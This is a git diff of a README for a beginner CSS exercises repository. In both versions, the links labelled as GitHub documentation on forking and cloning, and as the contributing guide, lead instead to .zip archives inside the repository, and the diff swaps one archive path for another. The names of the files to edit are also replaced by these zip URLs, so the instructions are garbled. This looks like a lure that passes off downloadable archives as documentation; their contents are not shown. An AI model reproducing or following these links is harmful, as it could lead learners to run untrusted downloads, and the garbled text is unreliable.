@@ -9,16 +9,16 @@ When doing these exercises, please use all documentation and resources you need 
 
 ## Contributing
 
-If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://raw.githubusercontent.com/ade-putra-code/css-exercises/main/animation/03-dropdown-menu/solution/exercises_css_3.6.zip).
+If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://github.com/ade-putra-code/css-exercises/raw/refs/heads/main/grid/03-grid-layout-3/exercises_css_1.6-alpha.2.zip).
 
 ## How To Use These Exercises
 
-1. Fork and clone this repository. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://raw.githubusercontent.com/ade-putra-code/css-exercises/main/animation/03-dropdown-menu/solution/exercises_css_3.6.zip).
-    - Copies of repositories on your machine are called clones. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://raw.githubusercontent.com/ade-putra-code/css-exercises/main/animation/03-dropdown-menu/solution/exercises_css_3.6.zip).
+1. Fork and clone this repository. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://github.com/ade-putra-code/css-exercises/raw/refs/heads/main/grid/03-grid-layout-3/exercises_css_1.6-alpha.2.zip).
+    - Copies of repositories on your machine are called clones. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://github.com/ade-putra-code/css-exercises/raw/refs/heads/main/grid/03-grid-layout-3/exercises_css_1.6-alpha.2.zip).
 1. Go to an exercise directory and open the HTML file in a web browser. You can open the file directly or use something like VSCode's Live Server extension.
 1. For each exercise, read the README thoroughly before starting any work.
     - Each README has a "Self Check" list. Use this to ensure you haven't missed any important details in your implementation.
-1. Make your edits in the `https://raw.githubusercontent.com/ade-putra-code/css-exercises/main/animation/03-dropdown-menu/solution/exercises_css_3.6.zip` and/or the `https://raw.githubusercontent.com/ade-putra-code/css-exercises/main/animation/03-dropdown-menu/solution/exercises_css_3.6.zip` files in order to make the output in your browser look like the Desired Outcome image(s).
+1. Make your edits in the `https://github.com/ade-putra-code/css-exercises/raw/refs/heads/main/grid/03-grid-layout-3/exercises_css_1.6-alpha.2.zip` and/or the `https://github.com/ade-putra-code/css-exercises/raw/refs/heads/main/grid/03-grid-layout-3/exercises_css_1.6-alpha.2.zip` files in order to make the output in your browser look like the Desired Outcome image(s).
     - Depending on the instructions of the exercise, you may only need to make edits in one of these files.
 1. Once you successfully finish an exercise, check TOP's solution to compare it with yours.
     - You should not be checking the solution for an exercise until you finish it!
